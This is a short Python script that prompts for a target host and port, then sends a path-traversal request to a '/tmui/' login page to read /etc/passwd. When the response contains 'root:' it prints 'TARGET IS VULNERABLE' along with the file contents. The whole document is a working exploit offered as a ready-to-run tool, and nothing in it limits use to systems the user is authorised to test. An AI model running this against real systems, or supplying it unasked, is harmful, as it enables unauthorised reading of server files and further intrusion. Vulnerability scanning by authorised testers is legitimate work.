import requests

target = input("ENTER THE TARGET SUBDOMAIN OR IP TO TEST ALSO ADD PORT NUMBER, COMMENLY FOUND ON 443, 8443, 10443 (eg: target.com:443): \n\n")
url = f"http://{target}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"

try:

    response = requests.get(url, verify=False, timeout=5)


    if response.status_code == 200 and "root:" in response.text:
        print("TARGET IS VULNERABLE!!!\n")
        print("OUTPUT OF /etc/passwd: \n")
        print(response.text)
    else:
        print("TARGET IS PROBABLY NOT VULNERABLE \n")

except Exception as e:
    print(f"ERROR CONNECTING TO TARGET: {e}\n")
